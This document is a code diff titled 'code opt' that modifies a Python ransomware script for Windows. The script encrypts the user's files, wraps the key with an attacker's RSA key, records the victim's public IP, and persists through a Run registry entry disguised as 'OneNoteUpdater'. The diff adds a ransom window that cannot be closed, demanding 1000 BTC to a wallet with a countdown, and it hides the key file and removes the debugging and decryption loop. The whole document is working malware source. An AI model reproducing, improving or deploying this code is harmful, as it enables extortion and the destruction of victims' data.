code opt

+++ RansomWare.py
@@ -4,19 +4,13 @@ import os # to get system root
 import ctypes # so we can interact with windows dlls and change windows background etc
 import urllib.request # used for downloading and saving background image
 import requests # used to make get reqeust to api.ipify.org to get target machine ip addr
-import time # used to time.sleep interval for ransom note & check desktop to decrypt system/files
-import datetime # to give time limit on ransom note
-import subprocess # to call subprocess
 import psutil
-import win32gui # used to get window text to see if ransom note is on top of all other windows
 from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
 from Crypto.Cipher import AES, PKCS1_OAEP
-import base64
 import threading # used for ransom note and decryption key on dekstop
 from tkinter import *
 import winreg
-import sys
 
 
 class RansomWare:
@@ -46,7 +40,7 @@ class RansomWare:
         # Use sysroot to create absolute path for files, etc. And for encrypting whole system
         self.sysRoot = os.path.expanduser('~')
         # Use localroot to test encryption softawre and for absolute path for files and encryption of "test system"
-        self.localRoot = r'C:\\Users\\xevep\\Downloads\\ransom' # Debugging/Testing
+        self.localRoot = r'C:\\Users\\xevep\\Desktop\\ransom' # Debugging/Testing
 
         # Get public IP of person, for more analysis etc. (Check if you have hit gov, military ip space LOL)
         self.publicIP = requests.get('https://api.ipify.org').text
@@ -60,8 +54,9 @@ class RansomWare:
 
     # Write the fernet(symmetric key) to text file
     def write_key(self):
-        with open('fernet_key.txt', 'wb') as f:
-            f.write(self.key)
+        if not os.path.exists("fernet_key.txt"):
+            with open('fernet_key.txt', 'wb') as f:
+                f.write(self.key)
 
     # Encrypt [SYMMETRIC KEY] that was created on victim machine to Encrypt/Decrypt files with our PUBLIC ASYMMETRIC-
     # -RSA key that was created on OUR MACHINE. We will later be able to DECRYPT the SYSMETRIC KEY used for-
@@ -69,20 +64,22 @@ class RansomWare:
     def encrypt_fernet_key(self):
         with open('fernet_key.txt', 'rb') as fk:
             fernet_key = fk.read()
-        with open('fernet_key.txt', 'wb') as f:
-            # Public RSA key
-            self.public_key = RSA.import_key(open('public.pem').read())
-            # Public encrypter object
-            public_crypter =  PKCS1_OAEP.new(self.public_key)
-            # Encrypted fernet key
-            enc_fernent_key = public_crypter.encrypt(fernet_key)
-            # Write encrypted fernet key to file
-            f.write(enc_fernent_key)
-        # Write encrypted fernet key to dekstop as well so they can send this file to be unencrypted and get system/files back
-        with open(f'{self.sysRoot}\\Desktop\\EMAIL_ME.txt', 'wb') as fa:
-            fa.write(enc_fernent_key)
+        if not os.path.exists("fernet_key.txt"):
+            with open('fernet_key.txt', 'wb') as f:
+                # Public RSA key
+                self.public_key = RSA.import_key(open('public.pem').read())
+                # Public encrypter object
+                public_crypter =  PKCS1_OAEP.new(self.public_key)
+                # Encrypted fernet key
+                enc_fernent_key = public_crypter.encrypt(fernet_key)
+                # Write encrypted fernet key to file
+                f.write(enc_fernent_key)      
+                ctypes.windll.kernel32.SetFileAttributesW("fernet_key.txt", 2)
+                self.key = enc_fernent_key
+
         # Assign self.key to encrypted fernet key
-        self.key = enc_fernent_key
+        else:
+           self.key = fernet_key
         # Remove fernet crypter object
         self.crypter = None
 
@@ -92,13 +89,8 @@ class RansomWare:
             # Read data from file
             data = f.read()
             if not encrypted:
-                # Print file contents - [debugging]
-                print(data)
                 # Encrypt data from file
                 _data = self.crypter.encrypt(data)
-                # Log file encrypted and print encrypted contents - [debugging]
-                print('> File encrpyted')
-                print(_data)
             else:
                 # Decrypt data from file
                 _data = self.crypter.decrypt(data)
@@ -111,8 +103,8 @@ class RansomWare:
         #rename file name
         if not encrypted:
             new_path = file_path + ".encrypt"
-        os.rename(file_path, new_path)
-        return new_path
+            os.rename(file_path, new_path)
+            return new_path
 
     # [SYMMETRIC KEY] Fernet Encrypt/Decrypt files on system using the symmetric key that was generated on victim machine
     def crypt_system(self, encrypted=False):
@@ -141,6 +133,11 @@ class RansomWare:
         p = psutil.Process(pid)
         p.nice(psutil.HIGH_PRIORITY_CLASS)
 
+        #fa la stessa cosa? è opzionale?
+        handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, pid)
+        ctypes.windll.kernel32.SetPriorityClass(handle, 0x00000080)
+        ctypes.windll.kernel32.CloseHandle(handle)
+
 
     def add_to_startup(self, file_path, key_name="OneNoteUpdater"):  # verrà utilizzato il nome di un programma familiare
         key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
@@ -168,34 +165,57 @@ class RansomWare:
         root.geometry("700x500")
         root.resizable(False, False)
 
-    # Decrypts system when text file with un-encrypted key in it is placed on dekstop of target machine
-    def put_me_on_desktop(self):
-        # Loop to check file and if file it will read key and then self.key + self.cryptor will be valid for decrypting-
-        # -the files
-        print('started') # Debugging/Testing
-        while True:
-            try:
-                print('trying') # Debugging/Testing
-                # The ATTACKER decrypts the fernet symmetric key on their machine and then puts the un-encrypted fernet-
-                # -key in this file and sends it in a email to victim. They then put this on the desktop and it will be-
-                # -used to un-encrypt the system. AT NO POINT DO WE GIVE THEM THE PRIVATE ASSYEMTRIC KEY etc.
-                with open(f'{self.sysRoot}\\Desktop\\PUT_ME_ON_DESKTOP.txt', 'r') as f:
-                    self.key = f.read()
-                    self.crypter = Fernet(self.key)
-                    # Decrpyt system once have file is found and we have cryptor with the correct key
-                    self.crypt_system(encrypted=True)
-                    print('decrypted') # Debugging/Testing
-                    break
-            except Exception as e:
-                print(e) # Debugging/Testing
-                pass
-            time.sleep(10) # Debugging/Testing check for file on desktop ever 10 seconds
-            print('Checking for PUT_ME_ON_DESKTOP.txt') # Debugging/Testing
-            # Would use below code in real life etc... above 10secs is just to "show" concept
-            # Sleep ~ 3 mins
-            # secs = 60
-            # mins = 3
-            # time.sleep((mins*secs))
+        def disable_event():
+            pass
+
+        root.protocol("WM_DELETE_WINDOW", disable_event)
+
+        Tk_Width = 700
+        Tk_Height = 500
+
+	
+        x_Left = int(root.winfo_screenwidth()/2 - Tk_Width/2)
+        y_Top = int(root.winfo_screenheight()/2 - Tk_Height/2)
+        
+        root.geometry("+{}+{}".format(x_Left, y_Top))
+
+        lb=Label(root,text="LAZARUS",font=("Segoe UI Black",24),bg="red",fg="white")
+        message_lb=Label(root,text="Your Files Are Be Encrypted, for Decrypt It\n Send 1000BTC in this Adress Before 21 Hours : \n ThDY834SVZGJfsdabsozv52lzssz084Bcsvz",font=("Segoe UI Black",15))
+        compteur_label=Label(root,font=("Segoe UI Black",60))
+        
+        def compteur(timing):
+		 #exemple = 01:12:59
+		
+
+            time_var=timing.split(":")
+            hour=int(time_var[0])
+            minu=int(time_var[1])
+            sec=int(time_var[2])
+            #compteur_label['text']=hour+":"+minu+":"+sec
+            compteur_label['text']="{}:{}:{}".format(hour,minu,sec)
+
+            if sec > 0 or minu >0 or hour>0:
+                if sec >0:
+                    sec=sec-1
+                elif minu>0:
+                    minu=minu-1
+                    sec=59
+                elif hour >0:
+                    hour=-1
+                    minu=59
+                    sec=59
+
+                root.after(1000,compteur,"{}:{}:{}".format(hour,minu,sec))
+
+        #lb.pack(side="top",expand="no",fill="both")
+        lb.grid(row=0,column=0,padx=240)
+        message_lb.grid(pady=(50))
+        compteur_label.grid()
+
+        compteur("21:59:10")
+
+        root.mainloop()
+
 
 def main():
     path = f'%USERPROFILE%\\Desktop'
@@ -208,17 +228,10 @@ def main():
     rw.change_desktop_background()
     rw.add_to_startup(path)
     rw.set_high_priority()
+    rw.show_ransom_note()
 
 
     t1 = threading.Thread(target=rw.show_ransom_note)
-    #t2 = threading.Thread(target=rw.put_me_on_desktop)
-
     t1.start()
-    print('> RansomWare: Attack completed on target machine and system is encrypted') # Debugging/Testing
-    print('> RansomWare: Waiting for attacker to give target machine document that will un-encrypt machine') # Debugging/Testing
-    #t2.start()
-    print('> RansomWare: Target machine has been un-encrypted') # Debugging/Testing
-    print('> RansomWare: Completed') # Debugging/Testing
-
 if __name__ == '__main__':
     main()
